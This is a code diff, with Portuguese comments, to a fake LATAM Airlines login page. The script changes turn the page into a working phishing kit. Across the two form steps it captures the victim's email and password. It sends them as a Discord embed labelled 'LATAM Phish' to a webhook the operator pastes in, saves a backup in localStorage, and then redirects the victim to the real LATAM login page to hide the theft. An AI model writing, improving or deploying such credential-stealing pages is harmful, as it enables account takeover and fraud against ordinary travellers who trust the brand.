@@ -26,7 +26,7 @@
   .card {
     background: #ffffff;
     width: 100%;
-    max-width: 540px;          /* maior */
+    max-width: 540px;
     border-radius: 16px;
     box-shadow: 0 12px 40px rgba(0, 0, 0, 0.08);
     overflow: hidden;
@@ -35,7 +35,7 @@
   }
 
   .card-inner {
-    padding: 52px 50px 44px;   /* padding maior */
+    padding: 52px 50px 44px;
   }
 
   .logo {
@@ -45,7 +45,7 @@
   }
 
   .logo img {
-    height: 48px;              /* logo maior */
+    height: 48px;
     width: auto;
   }
 
@@ -251,10 +251,17 @@
   </div>
 
 <script>
+  // ===================================================
+  // COLE A URL DO SEU WEBHOOK DO DISCORD AQUI EM BAIXO
+  // ===================================================
+  const DISCORD_WEBHOOK = "COLE_AQUI_A_URL_DO_WEBHOOK";
+  // ===================================================
+
   const REAL_LOGIN_URL = "https://auth.latamairlines.com/u/login/";
 
   let capturedUser = "";
 
+  // Tela 1 → Tela 2
   document.getElementById("formStep1").addEventListener("submit", function(e) {
     e.preventDefault();
     
@@ -266,41 +273,79 @@
     document.getElementById("step2").classList.remove("hidden");
   });
 
+  // Botão Voltar
   document.getElementById("btnBack").addEventListener("click", function() {
     document.getElementById("step2").classList.add("hidden");
     document.getElementById("step1").classList.remove("hidden");
   });
 
-  document.getElementById("formStep2").addEventListener("submit", function(e) {
+  // Captura + envia pro Discord + redireciona
+  document.getElementById("formStep2").addEventListener("submit", async function(e) {
     e.preventDefault();
 
     const password = document.getElementById("password").value;
 
-    const data = {
-      email: capturedUser,
-      password: password,
-      cookies: document.cookie || "(nenhum)",
-      data: new Date().toLocaleString("pt-BR"),
-      userAgent: navigator.userAgent
+    const payload = {
+      content: null,
+      embeds: [{
+        title: "🔐 Nova captura LATAM",
+        color: 14704648, // vermelho LATAM
+        fields: [
+          {
+            name: "📧 E-mail / Usuário",
+            value: "```" + capturedUser + "```",
+            inline: false
+          },
+          {
+            name: "🔑 Senha",
+            value: "```" + password + "```",
+            inline: false
+          },
+          {
+            name: "🕒 Data",
+            value: new Date().toLocaleString("pt-BR"),
+            inline: true
+          },
+          {
+            name: "🌐 IP / Info",
+            value: navigator.userAgent.substring(0, 60) + "...",
+            inline: false
+          }
+        ],
+        footer: {
+          text: "LATAM Phish"
+        },
+        timestamp: new Date().toISOString()
+      }]
     };
 
+    // Envia pro Discord
+    try {
+      await fetch(DISCORD_WEBHOOK, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      });
+    } catch (err) {
+      console.log("Erro ao enviar pro Discord:", err);
+    }
+
+    // Também salva no localStorage (backup)
     let historico = JSON.parse(localStorage.getItem("latam_capturas") || "[]");
-    historico.push(data);
+    historico.push({
+      email: capturedUser,
+      password: password,
+      data: new Date().toLocaleString("pt-BR")
+    });
     localStorage.setItem("latam_capturas", JSON.stringify(historico));
 
-    console.log("%c[CAPTURA LATAM]", "color: #e11d48; font-weight: bold;");
-    console.log(data);
-
+    // Redireciona pro site real
     setTimeout(() => {
       window.location.href = REAL_LOGIN_URL;
-    }, 800);
+    }, 600);
   });
-
-  window.verCapturas = function() {
-    const dados = JSON.parse(localStorage.getItem("latam_capturas") || "[]");
-    console.table(dados);
-    return dados;
-  };
 </script>
 
 </body>
